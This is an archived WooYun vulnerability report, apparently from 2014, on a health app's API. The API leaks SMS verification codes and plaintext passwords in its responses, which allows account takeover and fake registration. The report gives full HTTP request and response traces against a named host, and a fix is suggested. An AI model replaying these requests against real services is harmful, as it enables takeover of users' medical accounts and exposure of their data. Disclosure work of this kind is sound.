{"id": 50749, "wybug_id": "wooyun-2014-076941", "wybug_title": "某医联健康APP可以注册、忘记密码画面可绕过手机身份验证,推测帐号密码", "wybug_corp": "医联云健康", "wybug_author": "lucky_fn", "wybug_date": "2014-09-22 19:00", "wybug_open_date": "2014-11-06 19:02", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： APP好像很难查找开发商，提供已知信息问题APP名：医联云健康APP下载地址：http://apk.91.com/Soft/Android/cn.zgjkw.ydyl.dz-4.html短信联系方：泰福健康http://www.taivex.org/问题画面一：忘记密码忘记密码时先输入手机号，然后取得验证码，通过验证后，短信通知密码问题：只要暴力推测出用户手机号，可以通过抓包取得验证码和登录密码问题画面二：注册注册时需要输入手机验证码问题：可以通过抓包取得验证码 详细说明：  问题画面一：忘记密码\n\n输入手机号，取得验证码\n\n发现response已经有验证码7358：\nGET /BSoftNew.svc/GetMobileCheckCode?istaivextype=true&mobile=156...手机号省略...6 HTTP/1.1Host: ylyjk.taivex.org:81...省略...HTTP/1.1 200 OK...省略...{\"code\":\"0\",\"data\":{\"checkcode\":\"7358\"},\"header\":{\"action\":\"GetMobileCheckCode\",\"errreason\":\"\",\"requestseq\":\"0\"}}\n输入\n\n送信得到密码wooyun8899：\nGET /BSoftNew.svc/GetUserPasswordByCheckCode?messagetype=1&checkcode=7358&mobile=156...手机号省略...6 HTTP/1.1Host: ylyjk.taivex.org:81...省略...HTTP/1.1 200 OKCache-Control: privateContent-Length: 126Content-Type: text/plainServer: Microsoft-IIS/7.5X-AspNet-Version: 4.0.30319X-Powered-By: ASP.NETDate: Mon, 22 Sep 2014 05:59:58 GMT{\"code\":\"0\",\"data\":{\"password\":\"wooyun8899\"},\"header\":{\"action\":\"GetUserPasswordByCheckCode\",\"errreason\":\"\",\"requestseq\":\"0\"}}\n登录成功\nGET /BSoftNew.svc/Login?username=156...省略...6&DevID=8...省略...0&OS=2&logintype=2&DevType=GT-I9128E&ClientVer=1.2.2&password=wooyun8899&DevVer=4.2.2 HTTP/1.1Host: ylyjk.taivex.org:81...省略...HTTP/1.1 200 OK...省略...{\"code\":\"0\",\"data\":{\"token\":\"...省略...\",\"usertype\":\"2\",\"stunumber\":\"\",\"stucode\":\"\",\"mobile\":\"156...省略...6\",\"userkey\":\"\",\"ver\":\"1.0\",\"sn\":\"0...省略...2\",\"psn\":\"0...省略...2\",\"name\":\"æ³°ç¦å»è\",\"hoscode\":\"\",\"squcode\":\"\",\"hisucode\":\"\",\"servercurticks\":\"1...省略...4\",\"idcard\":\"\",\"realname\":\"156...省略...6\",\"logo\":\"\",\"sex\":\"\",\"sign\":\"156...省略...6\",\"cardnumber\":\"\",\"birthday\":\"\",\"header\":\"\",\"medicalcard\":\"\",\"outpatientcard\":\"\",\"patientid\":\"9...省略...2\",\"username\":\"156...省略...6\",\"orgcode\":\"0...省略...8\",\"password\":\"wooyun8899\",\"userid\":\"2...省略...8\",\"appmodule\":\"\"},\"header\":{\"action\":\"Login\",\"errreason\":\"\",\"requestseq\":\"0\",\"servercurticks\":\"1...省略...4\"}}\n\n\n问题画面二：注册\n\n点注册后直接在response里得到验证码，绕过手机了。。\nGET /BSoftNew.svc/GetMobileCheckCode?istaivextype=true&mobile=156...手机号省略...7 HTTP/1.1Host: ylyjk.taivex.org:81...省略...HTTP/1.1 200 OK...省略...{\"code\":\"0\",\"data\":{\"checkcode\":\"5821\"},\"header\":{\"action\":\"GetMobileCheckCode\",\"errreason\":\"\",\"requestseq\":\"0\"}}\n输入验证码：\n\n注册成功：\nGET /BSoftNew.svc/AddMobileUser?password=pentest&checkcode=5821&mobile=156...手机号省略...7 HTTP/1.1Host: ylyjk.taivex.org:81...省略...HTTP/1.1 200 OK...省略...{\"code\":\"0\",\"data\":{},\"header\":{\"action\":\"AddMobileUser\",\"errreason\":\"\",\"requestseq\":\"0\"}}\n\n\n   漏洞证明：  同上   修复方案：  不要把验证码、密码显示在请求响应中。   版权声明：转载请注明来源 lucky_fn@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}